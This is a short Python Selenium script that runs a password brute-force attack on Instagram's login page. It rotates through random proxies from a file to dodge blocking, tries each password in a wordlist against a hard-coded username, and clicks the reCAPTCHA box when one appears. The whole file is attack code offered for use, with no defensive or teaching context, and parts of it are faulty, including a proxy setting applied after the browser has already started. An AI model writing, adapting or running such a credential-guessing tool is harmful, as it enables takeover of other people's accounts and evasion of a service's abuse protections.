from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
import argparse
import time
import random


url='https://www.instagram.com/accounts/login/?force_classic_login'
proxies = open("proxies.txt","r")
proxy_list =[]
for _ in proxies:
    proxy_list.append(_)
#"https://instagram.com")

def login(username):
    firefox_profile = webdriver.FirefoxProfile()
    firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
    browser = webdriver.Firefox()
    browser.delete_all_cookies()
    print("[+] deleted all cookies")
    prox = random.choice(proxy_list)
    print(f"[+]using proxy:{prox}\n")
    webdriver.DesiredCapabilities.FIREFOX['proxy']={
           "httpProxy":prox,
            #"ftpProxy":prox,
            "sslProxy":prox,
            #"noProxy":None,
            "proxyType":"manual"
        }
    print("[+] opening instagram...")
    browser.get(url)
    time.sleep(2)
    print(f"username:{username}")
    wordlist = open("wordlist.txt","r")
    for _ in wordlist.readlines():
        password=_.strip()
        browser.find_element_by_name("username").clear()
        browser.find_element_by_name("username").send_keys(username)
        browser.find_element_by_name("password").clear()
        browser.find_element_by_name("password").send_keys(password)
        
        try:
            captcha=browser.find_element_by_class_name("recaptcha-checkbox-borderAnimation")
            captcha.click()
        except NoSuchElementException:
            pass
        try:
            browser.find_element_by_xpath("/html/body/div[2]/div/div/div[2]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div/div[3]/button").click()
            #return 0
            browser.implicitly_wait(4)
            try:
                browser.find_element_by_class_name("/html/body/div[2]/div/div/div[3]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div")
            except NoSuchElementException:
                pass
            try:
                wrong_pass = browser.find_element_by_id("slfErrorAlert")
                print("wrong password")
            except NoSuchElementException:
                pass
        except Exception as e:
            #return 1
            print(e)


if __name__ == '__main__':
    login("kushalr3ddy")#,"notnoice")
    
